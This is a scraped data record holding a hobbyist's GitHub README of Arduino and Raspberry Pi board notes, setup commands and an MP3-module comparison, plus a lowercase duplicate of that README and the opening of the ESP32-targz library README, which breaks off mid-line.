RGB matrix driver\nDriver for 8x8 RGB LED matrix.\nsee wiki for detailed information\nCJMCU-8x8 RGB matix\nAn 8x8 LED RGB matrix based on WS2812 \"NeoPixels\".\nsee README of example sketch for detailed info rmation.\nWEMOS D-Duino\nThe Wemos D-Duino is an ESP8266 board with an integrated SSD1306 OLED display connected via I2C.\nSSD1306 is connected with I2C and SCL connected to D2 and SDA connected to D1.\nsee example sketch for an example on how to use it with the u8g2 library.\nESP32 TTGO\nThe ESP32 TTGO is an EPS32 with an integrated SSD1306 OLED display connected via I2C. The board also has a 18650 battery holder on the back, and and on-off switch.\nSSD1306 is connected with I2C and SCL connected to GPIO4 and SDA connected to GPIO5.\nsee example sketch for an example on how to use it with the u8g2 library.\nHeltec WiFi Lora 32\nThe Heltec Wifi Lora 32 is an ESP32 board with a builtin OLED display and LORA transceiver.\nthe builtin LED is connected to GPIO 25 (e.g. use digitalWrite(25, 255))\nOLED: u8glib configuration U8X8_SSD1306_128X64_NONAME_SW_I2C u8x8(/* clock=*/ 15, /* data=*/ 4, /* reset=*/ 16);\nsee example sketch for an example on how to use the OLED\nTODO will add Lora example later ...\nRaspberry Pi 480x320 SPI TFT Display (3.5 inches)\nThe display is labeled with RPi Display 480x320 Pixel XPT246 Touch Controller and uses an ILI9486 controller. In raspian (tested with 2018-11-13 Raspian). no additional drivers are needed. I got it running with the following configuration:\nAdd to /boot/config.txt:\ndtparam=spi=on\ndtoverlay=piscreen,speed=16000000,rotate=270,fps=20\n(note that the 20 fps are not reached), After reboot, check with dmesg that the driver was loaded (framebuffer and touchscreen):\n12.814215] ads7846 spi0.1: touchscreen, irq 169\n[ 12.815503] input: ADS7846 Touchscreen as /devices/platform/soc/3f204000.spi/spi_master/spi0/spi0.1/input/input0\n[ 12.839795] fbtft: module is from the staging directory, the quality is unknown, you have been warned.\n[ 12.852267] fb_ili9486: module is from the staging directory, the quality is unknown, you have been warned.\n[ 12.853073] fbtft_of_value: regwidth = 16\n[ 12.853083] fbtft_of_value: buswidth = 8\n[ 12.853092] fbtft_of_value: debug = 0\n[ 12.853098] fbtft_of_value: rotate = 90\n[ 12.853105] fbtft_of_value: fps = 20\n...\n[ 13.613788] graphics fb1: fb_ili9486 frame buffer, 480x320, 300 KiB video memory, 4 KiB buffer memory, fps=20, spi0.0 at 16 MHz\nTest the display by loading an image using the fbi tool:\n$ sudo fbi -noverbose -T 1 -a -d /dev/fb1 image-test.gif\n(sudo is needed when command is run from ssh session).\nStart X11 on the framebuffer with sudo FBDEV=/dev/fb1 startx.\nFurther info\nhttp://ozzmaker.com/piscreen-driver-install-instructions-2/\nAdafruit info on FPS and SPI speed\nRPi case used: https://www.thingiverse.com/thing:1229473\nSipeed Longan Nano RISC-V proto board (GD32VF103CBT6)\nThe Sipeed Longan Nano GD32VF103CBT6 board hosts a 32-bit RISC-V cpu with 32KB of SRAM and 128KB of Flash and a 160x80 Pixel RGB LCD display.\nDFU mode\nTo upload a firmware image to the MCU, it has to be put into DFU mode first: Press and hold Boot before connecting the board using USB. Alternatively when the board is already connected: Press and hold boot and then reset to put the board in DFU mode, otherwise no upload is possible.\nCheck with lsusb|grep GD32 if the board was successfully detected, the output should look like:\nBus 001 Device 007: ID 28e9:0189 GDMicroelectronics GD32 0x418 DFU Bootloader\nRunning sudo dfu-util -l yields:\ndfu-util 0.9\n...\nFound DFU: [28e9:0189] ver=1000, devnum=7, cfg=1, intf=0, path=\"1-2\", alt=1, name=\"@Option Bytes /0x1FFFF800/01*016 g\", serial=\"??\"\nFound DFU: [28e9:0189] ver=1000, devnum=7, cfg=1, intf=0, path=\"1-2\", alt=0, name=\"@Internal Flash /0x08000000/512*002Kg\", serial=\"??\"\nUpload demo sketch\nBefore uploading to the MCU, make sure you installed the udev rules as described here. Afterwards a udevadm control --reload-rules && udevadm trigger (as root) might be necessary.\nThe demo sketch can be compiled and uploaded with make upload, after the board was set to DFU mode. The following error seems to have no effect, and can be ignored:\ndfu-util: dfuse_download: libusb_control_transfer returned -1\n*** [upload] Error 74\nIf the demo sketch works, you should now see the builtin LEDs cycle in colors red, green and blue.\nTODO\nLCD demo w/ arduino framework\nJLed demo\nRaspberry Pi HDMI LCD display (800x480, 4\")\nThe display is labelled \"4inch HDMI LCD\". The resolution is 800x480 and the display has a built in XPT2046 touch controller.\nI had to power both the Raspi (RPi 3) and the display to get it run. The display needs a custom resolution in /boot/config.txt, which is set by hdmi_mode=87 and hdmi_cvt.\nAdd to /boot/config.txt:\nframebuffer_width=800\nframebuffer_height=480\nhdmi_group=2\nhdmi_mode=87\nhdmi_cvt=480 800 60 6\ndisplay_hdmi_rotate=3\nTest the touch controller\nRaspberry Pi Pico (RP2040)\nThe Raspberry Pi Pico is a cheap but powerful new (end of 2020) micro controller. It features a dual core Arm cortex M0+ processor running with up to 133Mhz, 264Kb SRAM and 2MB flash memory. It has no WiFi or Bluetooth.\nTo flash the Pico, press the BOOTSEL button and attach the Pico using USB to your PC. The Pico will now act mass storage USB device. Simply copy the firmware (uf2 extension) to the drive. The Pico will automatically disconnect and reboot.\nThe Raspberry Pi Pico can be programmed in C/C++ or MicroPython. For C/C++ the pico-sdk and CMake must be used, which is not as easy to use as e.g. the Arduino IDE or platformio. To make things easier, I have created a docker image and a simple build script.\nLook here for an example in my JLed library\nofficial getting started guide\nPCA9685 driver board\nThe PCA9685 is an I2C bus controlled LED/Servo controller with 16 individually controllable PWM channels. Each channel has a resolution of 12 bits, resulting in 4096 steps. All channels operate at the same fixed frequency, which must be in the range between 24Hz and 1526Hz.\nThe board operates at 3V to 5V, which is fed through the VCC pin. The V+ pin is optional and is used to power servos or LEDs with up to 6V. The V+ voltage can also be fed through the green terminal block and is routed to the red V+ pins.\nEach of the yellow PWM outputs on the board has a 220 Ohms resistor in series, which allows the direct connection of a LED. The output level is the same as VCC.\nSDA and SCL are the I2C data and clock pins. The OE pin is optional (and pulled down by default) and is used to quickly disable all outputs (by setting OE to high level).\nThe I2C address is by default 0x40 and can be changed by closing the A0 to A5 pins using a soldering iron.\nThere are many libraries for PCA9685 based boards out there, I successfully used the Adafruit PWM Servo Driver library. Have a look at this example here.\nMP3 Modules\nI recently built a Music Box for Kids and evaluated some MP3 modules to find the right one for the job (I finally ended up using the DFPlayer Mini).\nWTV020M01 V1.00 DFPlayer Mini Catalex Serial MP3 Player V1.0 VS1053 MP3 Shield (geeetech) GPD2856A based\nDimensions (mm) 22x17 20x20 40x23 55x55 45x35, 22x34\nVCC 3.3V 3.2V-5V 3.2V-5.2V 3.7V-5V\nChip ? ? YX5300 VLSI VS1053B GPOD2856A\nMedia Micro SD, 1 or 2GB, very picky Micro SD up to 32GB Micro SD up to GB Micro SD\nFilesystem FAT16/32 FAT16/32 FAT16/32 FAT16/32\nMax Files 512 100*255 ? ? ?\nFormats AD4,NO MP3 MP3, WAV MP3, WAV MP1, MP2, MP3, MP4, AAC, OGG, WAV and more\nFrequency 32kHz 8-48kHz 11-48kHz\nAmplifier Yes Yes Line out only 2W Mono\nButtons Opt.: Play, Prev, Next, Vol+, Vol- Optional No Play, Prev, Next, Vol+, Vol-\nSerial Interface 2 Line + CLK UART 9600bps UART 9600bps\nMicrophone No No No Record in OGG, WAV\nMisc Busy signal, Reset input Busy signal, Equalizer\nPrice (04/2021) ca. 4\u20ac Starting at 1\u20ac ca. 2\u20ac ? starting at 1\u20ac\nLibrary Link Link Link n/a\nSite\nComment Better use DFPlayer Mini instead Small, reliable w/ Amplifier Many features, good documentation Standalone Player, w/ and wo/ buttons and terminals\nSummary:\nWTV020M01 is not recommended since not supporting MP3 format and very restrictive regarding SD cards used and audio encoding\nThe GPD2856A based boards are designed as stand alone players and are not meant to be controlled by a micro controller.\nThe DFPlayer Mini is a reliable board which can be controlled by a micro controller. It has an amplifier built in as well as an equalizer.\nThe VL1053 based shield supports many file formats and even recording of audio. It lacks an amplifier but is otherwise feature-packed.\nThe Catalex board is very simple to use and can be controlled by a micro controller. It lacks an amplifier and offers only a serial interface for control.\nAddiontial links:\nDFPlayerMini: https://wiki.dfrobot.com/DFPlayer_Mini_SKU_DFR0299\nCatalex: http://geekmatic.in.ua/pdf/Catalex_MP3_board.pdf\nGPD2856A: https://www.petervis.com/Electronics_Kits/gpd2856a/gpd2856a-mp3-decoder-board.html\nWTV020M01: https://hackaday.io/project/3508-portable-trollmaster-3000/log/12391-the-joy-of-using-an-underdocumented-module-and-using-a-plan-b-at-the-last-minute\nGeeetch VS1053: http://www.geeetech.com/wiki/index.php/Arduino_MP3_shield_board_with_TF_card\nProfiles for the VS1053: http://www.vlsi.fi/en/support/software/vs10xxapplications.html\nVS1053 notes\nThe module is also capable to record audio on the SD card in OGG Vorbis and WAV format. To encode the audio in OGG format, a plugin needs to be loaded from the SD card. The plugins are available here at VLSI. Pick yours from the profiles/ directory (files with .img extension). The name of the plugin is passed to the prepareRecordingOgg function. I had to change the name to conform to 8.3 naming (e.g. v08k1q06.img), otherwise the plugin did not load. Refer to the documentation for more details.\nLibraries and examples:\nhttps://github.com/adafruit/Adafruit_VS1053_Library\nhttps://github.com/madsci1016/Sparkfun-MP3-Player-Shield-Arduino-Library\nMisc\nWS2812 protection circuit\nI use this circuit when I connect WS2812 \"neo pixels\" to micro controllers (connected to DATA pin).\nAuthor\n(c) Copyright 2018-2021 by Jan Delgado. License: MIT", "link": "https://github.com/jandelgado/arduino", "origin": "Github", "suborigin": "arduino", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "arduino\nnotes on arduino libraries and sketches and other related stuff.\nmy libraries and projects\njled\nlog4arduino\neps32-aws-iot\nusb spinner game controller\nsimpson device (virtual drinking bird)\nsketches\ninterfacing ssd1306 based oled displays (spi)\ncolorduino rgb matrix driver\ncjmcu-8x8 rgb matix\nwemos d-duino\nesp32 ttgo\nheltec wifi lora 32\nraspberry pi 480x320 spi tft display (3.5 inches)\nfurther info\nsipeed longan nano risc-v proto board (gd32vf103cbt6)\ndfu mode\nupload demo sketch\ntodo\nraspberry pi hdmi lcd display (800x480, 4\")\nraspberry pi pico (rp2040)\npca9685 driver board\nmp3 modules\nvs1053 notes\nmisc\nws2812 protection circuit\nauthor\nmy libraries and projects\njled\njled is an arduino library to control leds. it uses a non-blocking approach and can control leds in simple (on/off) and complex (blinking, breathing) ways in a time-driven manner.\n// breathe led (on gpio 9) 6 times for 1500ms, waiting for 500ms after each run\n#include <jled.h>\nauto led_breathe = jled(9).breathe(1500).repeat(6).delayafter(500);\nvoid setup() { }\nvoid loop() {\nled_breathe.update();\n}\nhttps://github.com/jandelgado/jled\nlog4arduino\na lightweight, no-frills logging library for arduino & friends.\nlog(\"hello, log4arduino.\");\ndelay(42);\nlog(\"use %s formatting: %d %c %d %c %d\", \"printf\", 9, '+', 1, '=', 10);\nallows simple printf-like formatting and shows current time in millis and available memory, e.g.\n0(1623): hello, log4arduino.\n42(1609): use printf formatting: 9 + 1 = 10\nhttps://github.com/jandelgado/log4arduino\neps32-aws-iot\ncode, tools and instructions on how to connect esp32 securely to the aws iot cloud.\nhttps://github.com/jandelgado/esp32-aws-iot\nusb spinner game controller\nan arduino pro micro based usb spinner (like a paddle) game controller. great to play games like e.g. arkanoid. simulates an usb mouse and needs no drivers.\nhttps://github.com/jandelgado/usb-spinner\nsimpson device (virtual drinking bird)\nsimulates an usb mouse using an attiny85 (digispark board) and randomly moves your mouse (see the simpsons s07e07).\nhttps://github.com/jandelgado/simpson-device\nsketches\nto build the demo sketches you can either copy the folders to the source folder of your arduino ide or use platformio and the provided makefiles, e.g.:\n$ cd cjmcu_8x8_sample\n$ make upload\nthe following make targets can be used: run, envdump, clean, upload, monitor\ninterfacing ssd1306 based oled displays (spi)\nssd1306_sample_adafruit - sample code for ssd1306 based oled display. see wiki for detailed information\nssd1306_sample_u8g - sample code for ssd1306 based oled display. see wiki for detailed information\ncolorduino rgb matrix driver\ndriver for 8x8 rgb led matrix.\nsee wiki for detailed information\ncjmcu-8x8 rgb matix\nan 8x8 led rgb matrix based on ws2812 \"neopixels\".\nsee readme of example sketch for detailed info rmation.\nwemos d-duino\nthe wemos d-duino is an esp8266 board with an integrated ssd1306 oled display connected via i2c.\nssd1306 is connected with i2c and scl connected to d2 and sda connected to d1.\nsee example sketch for an example on how to use it with the u8g2 library.\nesp32 ttgo\nthe esp32 ttgo is an eps32 with an integrated ssd1306 oled display connected via i2c. the board also has a 18650 battery holder on the back, and and on-off switch.\nssd1306 is connected with i2c and scl connected to gpio4 and sda connected to gpio5.\nsee example sketch for an example on how to use it with the u8g2 library.\nheltec wifi lora 32\nthe heltec wifi lora 32 is an esp32 board with a builtin oled display and lora transceiver.\nthe builtin led is connected to gpio 25 (e.g. use digitalwrite(25, 255))\noled: u8glib configuration u8x8_ssd1306_128x64_noname_sw_i2c u8x8(/* clock=*/ 15, /* data=*/ 4, /* reset=*/ 16);\nsee example sketch for an example on how to use the oled\ntodo will add lora example later ...\nraspberry pi 480x320 spi tft display (3.5 inches)\nthe display is labeled with rpi display 480x320 pixel xpt246 touch controller and uses an ili9486 controller. in raspian (tested with 2018-11-13 raspian). no additional drivers are needed. i got it running with the following configuration:\nadd to /boot/config.txt:\ndtparam=spi=on\ndtoverlay=piscreen,speed=16000000,rotate=270,fps=20\n(note that the 20 fps are not reached), after reboot, check with dmesg that the driver was loaded (framebuffer and touchscreen):\n12.814215] ads7846 spi0.1: touchscreen, irq 169\n[ 12.815503] input: ads7846 touchscreen as /devices/platform/soc/3f204000.spi/spi_master/spi0/spi0.1/input/input0\n[ 12.839795] fbtft: module is from the staging directory, the quality is unknown, you have been warned.\n[ 12.852267] fb_ili9486: module is from the staging directory, the quality is unknown, you have been warned.\n[ 12.853073] fbtft_of_value: regwidth = 16\n[ 12.853083] fbtft_of_value: buswidth = 8\n[ 12.853092] fbtft_of_value: debug = 0\n[ 12.853098] fbtft_of_value: rotate = 90\n[ 12.853105] fbtft_of_value: fps = 20\n...\n[ 13.613788] graphics fb1: fb_ili9486 frame buffer, 480x320, 300 kib video memory, 4 kib buffer memory, fps=20, spi0.0 at 16 mhz\ntest the display by loading an image using the fbi -----> tool !!! :\n$ sudo fbi -noverbose -t 1 -a -d /dev/fb1 image-test.gif\n(sudo is needed when command is run from ssh session).\nstart x11 on the framebuffer with sudo fbdev=/dev/fb1 startx.\nfurther info\nhttp://ozzmaker.com/piscreen-driver-install-instructions-2/\nadafruit info on fps and spi speed\nrpi case used: https://www.thingiverse.com/thing:1229473\nsipeed longan nano risc-v proto board (gd32vf103cbt6)\nthe sipeed longan nano gd32vf103cbt6 board hosts a 32-bit risc-v cpu with 32kb of sram and 128kb of flash and a 160x80 pixel rgb lcd display.\ndfu mode\nto upload a firmware image to the mcu, it has to be put into dfu mode first: press and hold boot before connecting the board using usb. alternatively when the board is already connected: press and hold boot and then reset to put the board in dfu mode, otherwise no upload is possible.\ncheck with lsusb|grep gd32 if the board was successfully detected, the output should look like:\nbus 001 device 007: id 28e9:0189 gdmicroelectronics gd32 0x418 dfu bootloader\nrunning sudo dfu-util -l yields:\ndfu-util 0.9\n...\nfound dfu: [28e9:0189] ver=1000, devnum=7, cfg=1, intf=0, path=\"1-2\", alt=1, name=\"@option bytes /0x1ffff800/01*016 g\", serial=\"??\"\nfound dfu: [28e9:0189] ver=1000, devnum=7, cfg=1, intf=0, path=\"1-2\", alt=0, name=\"@internal flash /0x08000000/512*002kg\", serial=\"??\"\nupload demo sketch\nbefore uploading to the mcu, make sure you installed the udev rules as described here. afterwards a udevadm control --reload-rules && udevadm trigger (as root) might be necessary.\nthe demo sketch can be compiled and uploaded with make upload, after the board was set to dfu mode. the following error seems to have no effect, and can be ignored:\ndfu-util: dfuse_download: libusb_control_transfer returned -1\n*** [upload] error 74\nif the demo sketch works, you should now see the builtin leds cycle in colors red, green and blue.\ntodo\nlcd demo w/ arduino framework\njled demo\nraspberry pi hdmi lcd display (800x480, 4\")\nthe display is labelled \"4inch hdmi lcd\". the resolution is 800x480 and the display has a built in xpt2046 touch controller.\ni had to power both the raspi (rpi 3) and the display to get it run. the display needs a custom resolution in /boot/config.txt, which is set by hdmi_mode=87 and hdmi_cvt.\nadd to /boot/config.txt:\nframebuffer_width=800\nframebuffer_height=480\nhdmi_group=2\nhdmi_mode=87\nhdmi_cvt=480 800 60 6\ndisplay_hdmi_rotate=3\ntest the touch controller\nraspberry pi pico (rp2040)\nthe raspberry pi pico is a cheap but powerful new (end of 2020) micro controller. it features a dual core arm cortex m0+ processor running with up to 133mhz, 264kb sram and 2mb flash memory. it has no wifi or bluetooth.\nto flash the pico, press the bootsel button and attach the pico using usb to your pc. the pico will now act mass storage usb device. simply copy the firmware (uf2 extension) to the drive. the pico will automatically disconnect and reboot.\nthe raspberry pi pico can be programmed in c/c++ or micropython. for c/c++ the pico-sdk and cmake must be used, which is not as easy to use as e.g. the arduino ide or platformio. to make things easier, i have created a docker image and a simple build script.\nlook here for an example in my jled library\nofficial getting started guide\npca9685 driver board\nthe pca9685 is an i2c bus controlled led/servo controller with 16 individually controllable pwm channels. each channel has a resolution of 12 bits, resulting in 4096 steps. all channels operate at the same fixed frequency, which must be in the range between 24hz and 1526hz.\nthe board operates at 3v to 5v, which is fed through the vcc pin. the v+ pin is optional and is used to power servos or leds with up to 6v. the v+ voltage can also be fed through the green terminal block and is routed to the red v+ pins.\neach of the yellow pwm outputs on the board has a 220 ohms resistor in series, which allows the direct connection of a led. the output level is the same as vcc.\nsda and scl are the i2c data and clock pins. the oe pin is optional (and pulled down by default) and is used to quickly disable all outputs (by setting oe to high level).\nthe i2c address is by default 0x40 and can be changed by closing the a0 to a5 pins using a soldering iron.\nthere are many libraries for pca9685 based boards out there, i successfully used the adafruit pwm servo driver library. have a look at this example here.\nmp3 modules\ni recently built a music box for kids and evaluated some mp3 modules to find the right one for the job (i finally ended up using the dfplayer mini).\nwtv020m01 v1.00 dfplayer mini catalex serial mp3 player v1.0 vs1053 mp3 shield (geeetech) gpd2856a based\ndimensions (mm) 22x17 20x20 40x23 55x55 45x35, 22x34\nvcc 3.3v 3.2v-5v 3.2v-5.2v 3.7v-5v\nchip ? ? yx5300 vlsi vs1053b gpod2856a\nmedia micro sd, 1 or 2gb, very picky micro sd up to 32gb micro sd up to gb micro sd\nfilesystem fat16/32 fat16/32 fat16/32 fat16/32\nmax files 512 100*255 ? ? ?\nformats ad4,no mp3 mp3, wav mp3, wav mp1, mp2, mp3, mp4, aac, ogg, wav and more\nfrequency 32khz 8-48khz 11-48khz\namplifier yes yes line out only 2w mono\nbuttons opt.: play, prev, next, vol+, vol- optional no play, prev, next, vol+, vol-\nserial interface 2 line + clk uart 9600bps uart 9600bps\nmicrophone no no no record in ogg, wav\nmisc busy signal, reset input busy signal, equalizer\nprice (04/2021) ca. 4\u20ac starting at 1\u20ac ca. 2\u20ac ? starting at 1\u20ac\nlibrary link link link n/a\nsite\ncomment better use dfplayer mini instead small, reliable w/ amplifier many features, good documentation standalone player, w/ and wo/ buttons and terminals\nsummary:\nwtv020m01 is not recommended since not supporting mp3 format and very restrictive regarding sd cards used and audio encoding\nthe gpd2856a based boards are designed as stand alone players and are not meant to be controlled by a micro controller.\nthe dfplayer mini is a reliable board which can be controlled by a micro controller. it has an amplifier built in as well as an equalizer.\nthe vl1053 based shield supports many file formats and even recording of audio. it lacks an amplifier but is otherwise feature-packed.\nthe catalex board is very simple to use and can be controlled by a micro controller. it lacks an amplifier and offers only a serial interface for control.\naddiontial links:\ndfplayermini: https://wiki.dfrobot.com/dfplayer_mini_sku_dfr0299\ncatalex: http://geekmatic.in.ua/pdf/catalex_mp3_board.pdf\ngpd2856a: https://www.petervis.com/electronics_kits/gpd2856a/gpd2856a-mp3-decoder-board.html\nwtv020m01: https://hackaday.io/project/3508-portable-trollmaster-3000/log/12391-the-joy-of-using-an-underdocumented-module-and-using-a-plan-b-at-the-last-minute\ngeeetch vs1053: http://www.geeetech.com/wiki/index.php/arduino_mp3_shield_board_with_tf_card\nprofiles for the vs1053: http://www.vlsi.fi/en/support/software/vs10xxapplications.html\nvs1053 notes\nthe module is also capable to record audio on the sd card in ogg vorbis and wav format. to encode the audio in ogg format, a plugin needs to be loaded from the sd card. the plugins are available here at vlsi. pick yours from the profiles/ directory (files with .img extension). the name of the plugin is passed to the preparerecordingogg function. i had to change the name to conform to 8.3 naming (e.g. v08k1q06.img), otherwise the plugin did not load. refer to the documentation for more details.\nlibraries and examples:\nhttps://github.com/adafruit/adafruit_vs1053_library\nhttps://github.com/madsci1016/sparkfun-mp3-player-shield-arduino-library\nmisc\nws2812 protection circuit\ni use this circuit when i connect ws2812 \"neo pixels\" to micro controllers (connected to data pin).\nauthor\n(c) copyright 2018-2021 by jan delgado. license: mit", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000596, "year": null}, {"Unnamed: 0": 2643, "autor": 603, "date": null, "content": "\ud83d\udddc\ufe0f ESP32-targz\nAn ESP32/ESP8266 Arduino library to provide decompression support for .tar, .gz and .tar.gz files\nThis library is a wrapper for the following two great libraries:\nuzlib https://github.com/pfalcon/uzlib\nTinyUntar https://github.com/dsoprea/TinyUntar\nThis library enables the channeling of gz \u27a1\ufe0f tar \u27a1\ufe0f filesystem data without using an intermediate file (bug: see #4).\nIn order to reach this goal, TinyUntar was heavily modified to allow data streaming, uzlib is also customized.\nTradeoffs\nWhen the output is the filesystem (e.g. NOT when streaming to TAR), gzip can work without the dictionary. Disabling the dictionary can cause huge slowdowns but saves ~36KB of ram.\nTinyUntar requires 512bytes only so its memory footprint is negligible.\nLimitations\nESP32-TarGz can only have one output filesystem (see Support Matrix), and it must be set at compilation time (see Usage). This limitation does not apply to the input filesystem/stream.\nScope\nThis library is only for unpacking / decompressing, no compression support is provided whatsoever\nAlthough the examples use SPIFFS as default, it should work with any fs::FS filesystem (SD, SD_MMC, FFat, LittleFS) and streams (HTTP, HTTPS, UDP, CAN, Ethernet)\nThis is experimental, expect bugs!\nContributions and feedback are more than welcome :-)\nSupport Matrix\nfs::FS SPIFFS LittleFS SD SD_MMC FFAT\nESP32 1.0 1.0.5 1.0.5 1.0 1.0\nESP8266 builtin 0.1.0 0.1.0 n/a n/a\nUsage\n\u26a0\ufe0f Important note: setting the #define before including <ESP32-targz.h> is mandatory otherwise it will be ignored and the library will default to SPIFFS.\n// Set **destination** filesystem by uncommenting one of these:\n//#define DEST_FS_USES_SPIFFS\n//#define DEST_FS_USES_FFAT\n//#define DEST_FS_USES_SD\n//#define DEST_FS_USES_SD_MMC\n#define DEST_FS_USES_LITTLEFS\n#include <ESP32-targz.h>\n// filesystem object will be available as \"tarGzFS\"\nExtract content from .gz file\n// mount spiffs (or any other filesystem)\ntarGzFS.begin();\nGzUnpacker *GZUnpacker = new GzUnpacker();\nGZUnpacker->haltOnError( true ); // stop on fail (manual restart/reset required)\nGZUnpacker->setupFSCallbacks( targzTotalBytesFn, targzFreeBytesFn ); // prevent the partition from exploding, recommended\nGZUnpacker->setGzProgressCallback( BaseUnpacker::defaultProgressCallback ); // targzNullProgressCallback or defaultProgressCallback\nGZUnpacker->setLoggerCallback( BaseUnpacker::targzPrintLoggerCallback ); // gz log verbosity\n// expand one file\nif( !GZUnpacker->gzExpander(tarGzFS, \"/gz_example.gz\", tarGzFS, \"/gz_example.jpg\") ) {\nSerial.printf(\"gzExpander failed with return code #%d\", GZUnpacker->tarGzGetError() );\n}\n// expand another file\nif( ! gzExpander(tarGzFS, \"/blah.gz\", tarGzFS, \"/blah.jpg\") ) {\nSerial.printf(\"operation failed with return code #%d\", GZUnpacker->tarGzGetError() );\n}\nExpand contents from .tar file to /tmp folder\n// mount spiffs (or any other filesystem)\ntarGzFS.begin();\nTarUnpacker *TARUnpacker = new TarUnpacker();\nTARUnpacker->haltOnError( true ); // stop on fail (manual restart/reset required)\nTARUnpacker->setTarVerify( true ); // true = enables health checks but slows down the overall process\nTARUnpacker->setupFSCallbacks( targzTotalBytesFn, targzFreeBytesFn ); // prevent the partition from exploding, recommended\nTARUnpacker->setTarProgressCallback( BaseUnpacker::defaultProgressCallback ); // prints the untarring progress for each individual file\nTARUnpacker->setTarStatusProgressCallback( BaseUnpacker::defaultTarStatusProgressCallback ); // print the filenames as they're expanded\nTARUnpacker->setTarMessageCallback( BaseUnpacker::targzPrintLoggerCallback ); // tar log verbosity\nif( !TARUnpacker->tarExpander(tarGzFS, \"/tar_example.tar\", tarGzFS, \"/\") ) {\nSerial.printf(\"tarExpander failed with return code #%d\\n\", TARUnpacker->tarGzGetError() );\n}\nExpand contents from .tar.gz to /tmp folder\n// mount spiffs (or any other filesystem)\ntarGzFS.begin();\nTarGzUnpacker *TARGZUnpacker = new TarGzUnpacker();\nTARGZUnpacker->haltOnError( true ); // stop on fail (manual restart/reset required)\nTARGZUnpacker->setTarVerify( true ); // true = enables health checks but slows down the overall process\nTARGZUnpacker->setupFSCallbacks( targzTotalBytesFn, targzFreeBytesFn ); // prevent the partition from exploding, recommended\nTARGZUnpacker->setGzProgressCallback( BaseUnpacker::defaultProgressCallback ); // targzNullProgressCallback or defaultProgressCallback\nTARGZUnpacker->setLoggerCallback( BaseUnpacker::targzPrintLoggerCallback ); // gz log verbosity\nTARGZUnpacker->setTarProgressCallback( BaseUnpacker::defaultProgressCallback ); // prints the untarring progress for each individual file\nTARGZUnpacker->setTarStatusProgressCallback( BaseUnpacker::defaultTarStatusProgressCallback ); // print the filenames as they're expanded\nTARGZUnpacker->setTarMessageCallback( BaseUnpacker::targzPrintLoggerCallback ); // tar log verbosity\n// using an intermediate file (default is /tmp/tmp.tar)\nif( !TARGZUnpacker->tarGzExpander(tarGzFS, \"/targz_example.tar.gz\", tarGzFS, \"/tmp\") ) {\nSerial.printf(\"tarGzExpander+intermediate file failed with return code #%d\\n\", TARGZUnpacker->tarGzGetError() );\n}\n// or without intermediate file\nif( !TARGZUnpacker->tarGzExpander(tarGzFS, \"/targz_example.tar.gz\", tarGzFS, \"/tmp\", nullptr ) ) {\nSerial.printf(\"tarGzExpander+intermediate file failed with return code #%d\\n\", TARGZUnpacker->tarGzGetError() );\n}\nFlash the ESP with contents from .gz file\n// mount spiffs (or any other filesystem)\ntarGzFS.begin();\nGzUnpacker *GZUnpacker = new GzUnpacker();\nGZUnpacker->haltOnError( true ); // stop on fail (manual restart/reset required)\nGZUnpacker->setupFSCallbacks( targzTotalBytesFn, targzFreeBytesFn ); // prevent the partition from exploding, recommended\nGZUnpacker->setGzProgressCallback( BaseUnpacker::defaultProgressCallback ); // targzNullProgressCallback or defaultProgressCallback\nGZUnpacker->setLoggerCallback( BaseUnpacker::targzPrintLoggerCallback ); // gz log verbosity\nif( ! GZUnpacker->gzUpdater(tarGzFS, firmwareFile, /*don't restart after update*/false ) ) {\nSerial.printf(\"gzUpdater failed with return code #%d\\n\", GZUnpacker->tarGzGetError() );\n}\nESP32 Only: Flash the ESP with contents from .gz stream\n// mount spiffs (or any other filesystem)\ntarGzFS.begin();\nfs::File file = tarGzFS.open( \"/example_firmware.gz\", \"r\" );\nif (!file) {\nSerial.println(\"Can't open file\");\nreturn;\n}\nGzUnpacker *GZUnpacker = new GzUnpacker();\nGZUnpacker->haltOnError( true ); // stop on fail (manual restart/reset required)\nGZUnpacker->setupFSCallbacks( targzTotalBytesFn, targzFreeBytesFn ); // prevent the partition from exploding, recommended\nGZUnpacker->setGzProgressCallback( BaseUnpacker::defaultProgressCallback ); // targzNullProgressCallback or defaultProgressCallback\nGZUnpacker->setLoggerCallback( BaseUnpacker::targzPrintLoggerCallback ); // gz log verbosity\nif( !GZUnpacker->gzStreamUpdater( (Stream *)&file, UPDATE_SIZE_UNKNOWN ) ) {\nSerial.printf(\"gzStreamUpdater failed with return code #%d\\n\", GZUnpacker->tarGzGetError() );\n}\nESP32 Only: Direct expansion (no intermediate file) from .tar.gz. stream\n// mount spiffs (or any other filesystem)\ntarGzFS.begin();\nfs::File file = tarGzFS.open( \"/example_archive.tgz\", \"r\" );\nif (!file) {\nSerial.println(\"Can't open file\");\nreturn;\n}\nTarGzUnpacker *TARGZUnpacker = new TarGzUnpacker();\nTARGZUnpacker->haltOnError( true ); // stop on fail (manual restart/reset required)\nTARGZUnpacker->setTarVerify( true ); // true = enables health checks but slows down the overall process\nTARGZUnpacker->setupFSCallbacks( targzTotalBytesFn, targzFreeBytesFn ); // prevent the partition from exploding, recommended\nTARGZUnpacker->setGzProgressCallback( BaseUnpacker::defaultProgressCallback ); // targzNullProgressCallback or defaultProgressCallback\nTARGZUnpacker->setLoggerCallback( BaseUnpacker::targzPrintLoggerCallback ); // gz log verbosity\nTARGZUnpacker->setTarProgressCallback( BaseUnpacker::defaultProgressCallback ); // prints the untarring progress for each individual file\nTARGZUnpacker->setTarStatusProgressCallback( BaseUnpacker::defaultTarStatusProgressCallback ); // print the filenames as they're expanded\nTARGZUnpacker->setTarMessageCallback( BaseUnpacker::targzPrintLoggerCallback ); // tar log verbosity\nif( !TARGZUnpacker->tarGzStreamExpander( (Stream *)&file, tarGzFS ) ) {\nSerial.printf(\"tarGzStreamExpander failed with return code #%d\\n\", TARGZUnpacker->tarGzGetError() );\n}\nESP32 Only: Direct Update (no intermediate file) from .tar.gz. stream\nTarGzUnpacker *TARGZUnpacker = new TarGzUnpacker();\nTARGZUnpacker->haltOnError( true ); // stop on fail (manual restart/reset required)\nTARGZUnpacker->setTarVerify( false ); // nothing to verify as we're writing a partition\nTARGZUnpacker->setGzProgressCallback( BaseUnpacker::targzNullProgressCallback ); // don't care about gz progress\nTARGZUnpacker->setTarProgressCallback( BaseUnpacker::defaultProgressCallback ); // prints the untarring progress for each individual partition\nTARGZUnpacker->setTarStatusProgressCallback( 